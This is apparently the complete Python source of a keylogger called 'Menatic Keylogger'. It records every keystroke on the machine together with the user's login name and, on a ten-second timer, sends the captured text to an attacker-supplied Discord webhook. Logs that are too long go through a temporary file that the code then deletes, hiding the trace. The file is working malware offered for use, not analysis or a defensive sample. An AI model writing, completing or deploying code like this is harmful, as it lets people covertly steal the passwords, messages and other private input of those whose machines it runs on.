# Imports

import os
from datetime import datetime
from wsgiref.headers import tspecials
from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Timer
import keyboard


time_to_send_logs = 10

discord_webhooks_url = "paste_here"

class Menatic_Keylogger:
    def __init__(self, time_to_send, transfer_through="webhook"):
        current_time = datetime.now()
        self.time_to_send = time_to_send
        self.transfer_through = transfer_through
        self.logs = ""
        self.start_date_time = current_time.strftime('%d/%m/%Y %H:%M')
        self.end_date_time = current_time.strftime('%d/%m/%Y %H:%M')
        self.uname = os.getlogin()
        
    def callback(self, event):
        name = event.name
        
        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                
        self.logs +=name
        
    def send_to_webhooks(self):
        flag = False
        webhook = DiscordWebhook(url=discord_webhooks_url)
        if len(self.logs) > 2000:
            flag = True
            path = os.environ["temp"] + "\\tempfiles007.txt"
            with open(path, 'w+') as file:
                file.write(f"[+] Incoming Report from Menatic Keylogger for the user {self.uname}  Time: {self.end_date_time} \n\n")
                file.write(self.logs)
                
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='tempfiles007.txt')
                
        else:
            embed = DiscordEmbed(title="Incoming Report from Menatic Keylogger for the user ({self.uname}) Time: {self.end_date_time}", Description = self.logs)
            webhook.add_embed(embed)
            
        webhook.execute()
        
        if flag:
            os.remove(path)
            
    def report(self):
        if self.logs:
            if self.transfer_through == "webhook":
                self.send_to_webhooks()
                
        self.logs = ""
        timer = Timer(interval=self.time_to_send, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):
        self.start_date_time = datetime.now()
        keyboard.on_release(callback = self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    try:
        MenaticKeylogger = Menatic_Keylogger(time_to_send = time_to_send_logs, transfer_through="webhook")
        MenaticKeylogger.start()
    except KeyboardInterrupt:
        print('\n EXITING.....GOODBYE!!')        
        
        
        
